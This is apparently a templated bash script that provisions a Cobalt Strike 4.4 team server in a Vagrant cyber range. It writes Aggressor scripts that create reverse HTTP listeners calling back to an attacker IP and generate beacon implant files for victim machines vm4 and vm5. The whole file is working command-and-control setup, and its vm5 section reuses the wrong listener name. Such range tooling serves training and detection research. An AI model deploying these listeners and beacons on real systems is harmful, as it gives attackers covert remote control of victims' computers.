#!/bin/bash
set -e
set -x

# Extract CS and start team server
rm -rf Cobaltstrike-4.4
unzip /vagrant/cobaltstrike-4.4.zip
cd Cobaltstrike-4.4
chmod 755 teamserver agscript

echo "Team server starting ..."
tmux new-session -d -s collector -n teamserver 'sudo ./teamserver {{ attacker["ip"] }} {{ attacker["team_server_pwd"]}}'
sleep 20  # wait for team server starting
nc -zv localhost 50050 && echo 'team server start successfully!'

# vm4: reverse_http on Cobalt Strike

lfn=/vagrant/{{ range_root }}/{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}
cat << EOF > $lfn.cna
on ready {
  listener_create_ext("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm4']['payload'] }}", %(host => "{{ attacker['ip'] }}", port => {{ attacker['team_server_port'] }}, beacons => "{{ attacker['ip'] }}"));
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners() . "\n");
}

on beacon_initial {
  println("[Initial]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . "\n");
}

on beacon_checkin {
  println("[Checkin]" . formatDate("HH:mm:ss z") . " Beacon ". \$1 . ", MSG: " . \$2 . "\n");
}

on beacon_input {
  println("[Input]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . ", RESP: " . \$3 . "\n");
}

on beacon_output {
  println("[Output]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . "\n");
}
EOF

echo "Listener starting ..."
nohup ./agscript {{ attacker['ip'] }} 50050 monlis {{ attacker['team_server_pwd']}} $lfn.cna &> $lfn.log &
sleep 10
cat $lfn.log
echo -n "agscript PID: " && pgrep agscript

bfn=/vagrant/{{ range_root }}/{{ victim['vm4']['beacon_file'] }}
cat << 'EOF' > $bfn.cna
on ready {
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
  \$data = artifact_payload("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm4']['beacon_format'] }}", "{{ victim['vm4']['arch'] }}", "process", "None");
  \$handle = openf(">$bfn");
  writeb(\$handle, \$data);
  closef(\$handle);
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}.{{ victim['vm4']['beacon_format'] }}" . " created successfully!")
  closeClient();
}
EOF

echo "Generating beacon ..."
./agscript {{ attacker['ip'] }} 50050 vm4 {{ attacker['team_server_pwd']}} $bfn.cna &> $bfn.log
sleep 5
cat $bfn.log

# vm5: reverse_https on Cobalt Strike

lfn=/vagrant/{{ range_root }}/{{ attacker['listener']['cobaltstrike']['rhttps']['name'] }}
cat << EOF > $lfn.cna
on ready {
  listener_create_ext("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm5']['payload'] }}", %(host => "{{ attacker['ip'] }}", port => {{ attacker['team_server_port'] }}, beacons => "{{ attacker['ip'] }}"));
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners() . "\n");
}

on beacon_initial {
  println("[Initial]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . "\n");
}

on beacon_checkin {
  println("[Checkin]" . formatDate("HH:mm:ss z") . " Beacon ". \$1 . ", MSG: " . \$2 . "\n");
}

on beacon_input {
  println("[Input]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . ", RESP: " . \$3 . "\n");
}

on beacon_output {
  println("[Output]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . "\n");
}
EOF

echo "Listener starting ..."
nohup ./agscript {{ attacker['ip'] }} 50050 monlis {{ attacker['team_server_pwd']}} $lfn.cna &> $lfn.log &
sleep 10
cat $lfn.log
echo -n "agscript PID: " && pgrep agscript

bfn=/vagrant/{{ range_root }}/{{ victim['vm5']['beacon_file'] }}
cat << 'EOF' > $bfn.cna
on ready {
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
  \$data = artifact_payload("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm5']['beacon_format'] }}", "{{ victim['vm5']['arch'] }}", "process", "None");
  \$handle = openf(">$bfn");
  writeb(\$handle, \$data);
  closef(\$handle);
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}.{{ victim['vm5']['beacon_format'] }}" . " created successfully!")
  closeClient();
}
EOF

echo "Generating beacon ..."
./agscript {{ attacker['ip'] }} 50050 vm5 {{ attacker['team_server_pwd']}} $bfn.cna &> $bfn.log
sleep 5
cat $bfn.log


